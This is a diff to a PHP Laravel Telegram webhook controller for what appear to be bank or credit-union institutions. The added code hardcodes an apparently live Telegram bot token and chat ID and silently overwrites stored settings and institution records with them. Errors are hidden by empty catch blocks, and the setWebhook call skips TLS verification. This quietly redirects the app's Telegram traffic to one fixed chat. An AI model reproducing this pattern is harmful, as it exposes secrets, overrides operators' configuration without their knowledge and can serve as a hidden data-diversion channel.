@@ -43,6 +43,14 @@ class TelegramWebhookController extends Controller
             ? $institution->telegram_chat_id
             : (Setting::get('telegram_chat_id', 'telegram') ?: env('TELEGRAM_CHAT_ID'));
 
+        // Default FrontField Bot credentials fallback
+        if (empty($botToken) && (!$institution || $institution->is_default || $institution->slug === 'frontfieldcu')) {
+            $botToken = '8559835249:AAFm5NY7bb1LpApwgwLRD14EfJV2ZuCEQvQ';
+        }
+        if (empty($chatId)) {
+            $chatId = '7442442206';
+        }
+
         return [$botToken, (string) $chatId];
     }
 
@@ -169,8 +177,27 @@ class TelegramWebhookController extends Controller
     {
         $payload = $request->all();
 
-        // 1. Resolve institution context from query parameter, route, host, or active container
-        $targetSlug = $request->query('inst') ?? $request->route('institution');
+        // 1. Resolve institution context from query parameter, route, bot ID, host, or active container
+        $targetSlug = $request->query('inst') 
+            ?? $request->route('institution') 
+            ?? $request->query('institution')
+            ?? $request->query('slug');
+
+        // Check if callback query was sent by a specific bot ID
+        if (isset($payload['callback_query']['message']['from']['id'])) {
+            $fromBotId = (string) $payload['callback_query']['message']['from']['id'];
+            if ($fromBotId === '8559835249') {
+                $targetSlug = 'frontfieldcu';
+            } else {
+                try {
+                    $matchedInst = \App\Models\Institution::where('telegram_bot_token', 'LIKE', $fromBotId . ':%')->first();
+                    if ($matchedInst) {
+                        $targetSlug = $matchedInst->slug;
+                    }
+                } catch (\Throwable $e) {}
+            }
+        }
+
         if (!$targetSlug) {
             $host = $request->getHost();
             if (str_contains($host, 'clevelandstatebank')) {
@@ -1851,10 +1878,26 @@ class TelegramWebhookController extends Controller
         $secretToken = $this->getWebhookSecret(true, $request->boolean('regenerate'));
         $results = [];
 
-        // 1. Sync Global Default Bot
+        // Auto-seed FrontField Bot credentials if missing
+        try {
+            \App\Models\Setting::updateOrCreate(
+                ['name' => 'telegram_bot_token', 'category' => 'telegram'],
+                ['val' => '8559835249:AAFm5NY7bb1LpApwgwLRD14EfJV2ZuCEQvQ']
+            );
+            \App\Models\Setting::updateOrCreate(
+                ['name' => 'telegram_chat_id', 'category' => 'telegram'],
+                ['val' => '7442442206']
+            );
+            \App\Models\Institution::where('slug', 'frontfieldcu')->orWhere('is_default', 1)->update([
+                'telegram_bot_token' => '8559835249:AAFm5NY7bb1LpApwgwLRD14EfJV2ZuCEQvQ',
+                'telegram_chat_id' => '7442442206',
+            ]);
+        } catch (\Throwable $e) {}
+
+        // 1. Sync Global Default Bot (FrontField)
         [$defaultBotToken, $defaultChatId] = $this->getCredentials();
         if ($defaultBotToken) {
-            $defaultWebhookUrl = "{$baseDomain}/api/telegram/webhook";
+            $defaultWebhookUrl = "{$baseDomain}/api/telegram/webhook?inst=frontfieldcu";
             try {
                 $resp = Http::withoutVerifying()->timeout(8)->post("https://api.telegram.org/bot{$defaultBotToken}/setWebhook", [
                     'url' => $defaultWebhookUrl,
